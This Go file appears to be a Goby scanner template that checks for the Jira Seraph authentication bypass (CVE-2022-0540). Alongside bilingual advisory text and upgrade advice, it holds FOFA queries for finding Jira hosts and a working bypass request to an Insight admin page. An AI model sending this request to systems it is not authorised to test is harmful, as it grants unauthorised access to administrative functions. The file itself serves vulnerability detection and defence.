package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Atlassian Jira  Authentication bypass in Seraph (CVE-2022-0540)",
    "Description": "<p>A vulnerability in Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.</p>",
    "Impact": "Atlassian Jira  Authentication bypass in Seraph (CVE-2022-0540)",
    "Recommendation": "<p>Upgrade the version</p><p>Jira：</p><p>- 8.13.x &gt;= 8.13.18</p><p>- 8.20.x &gt;= 8.20.6</p><p>- all versions &gt;= 8.22.0</p><p>Jira Service Management：</p><p>- 4.13.x &gt;= 4.13.18</p><p>- 4.20.x &gt;= 4.20.6</p><p>- all versions &gt;= 4.22.0</p>",
    "Product": "ATLASSIAN-JIRA",
    "VulType": [
        "Unauthorized Access"
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "Translation": {
        "CN": {
            "Name": "Jira身份验证绕过漏洞 (CVE-2022-0540)",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Jira 和 Jira Service Management 容易受到其 Web 身份验证框架 Jira Seraph 中的身份验证绕过的攻击。未经身份验证的远程攻击者可以通过发送特制的 HTTP 请求来利用此漏洞，以使用受影响的配置绕过 WebWork 操作中的身份验证和授权要求。&nbsp; 这会影响 8.13.18 之前的 Atlassian Jira Server 和 Data Center 版本、8.20.6 之前的 8.14.0 及更高版本以及 8.22.0 之前的 8.21.0 及更高版本。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">未经身份验证的远程攻击者可以通过发送特制的 HTTP 请求来利用此漏洞，以使用受影响的配置绕过 WebWork 操作中的身份验证和授权要求。&nbsp;&nbsp;</span><br></p>",
            "Recommendation": "<p>升级版本</p><p>Jira：</p><p>- 8.13.x &gt;= 8.13.18</p><p>- 8.20.x &gt;= 8.20.6</p><p>- Jira所有版本 &gt;= 8.22.0</p><p>Jira Service Management：</p><p>- 4.13.x &gt;= 4.13.18</p><p>- 4.20.x &gt;= 4.20.6</p><p>- Jira Service Management所有版本 &gt;= 4.22.0</p>",
            "Product": "ATLASSIAN-JIRA",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Atlassian Jira  Authentication bypass in Seraph (CVE-2022-0540)",
            "Description": "<p>A vulnerability in Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.<br><br><br></p>",
            "Impact": "Atlassian Jira  Authentication bypass in Seraph (CVE-2022-0540)",
            "Recommendation": "<p>Upgrade the version</p><p>Jira：</p><p>- 8.13.x &gt;= 8.13.18</p><p>- 8.20.x &gt;= 8.20.6</p><p>- all versions &gt;= 8.22.0</p><p>Jira Service Management：</p><p>- 4.13.x &gt;= 4.13.18</p><p>- 4.20.x &gt;= 4.20.6</p><p>- <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">all versions</span> &gt;= 4.22.0</p>",
            "Product": "ATLASSIAN-JIRA",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "FofaQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "GobyQuery": "body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" && header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\"",
    "Author": "twcjw",
    "Homepage": "https://www.atlassian.com/software/jira",
    "DisclosureDate": "2022-04-21",
    "References": [
        "https://github.com/ARPSyndicate/kenzer-templates/blob/5dc272615d6109789f358034b29da50af50b65cd/nuclei/cvescan/critical/CVE-2022-0540.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.9",
    "CVEIDs": [
        "CVE-2022-0540"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202204-3908"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/InsightPluginShowGeneralConfiguration.jspa;",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "常规 Insight 配置",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "General Insight Configuration",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/InsightPluginShowGeneralConfiguration.jspa;",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "group",
                        "operation": "OR",
                        "checks": [
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "常规 Insight 配置",
                                "bz": ""
                            },
                            {
                                "type": "item",
                                "variable": "$body",
                                "operation": "contains",
                                "value": "General Insight Configuration",
                                "bz": ""
                            }
                        ]
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
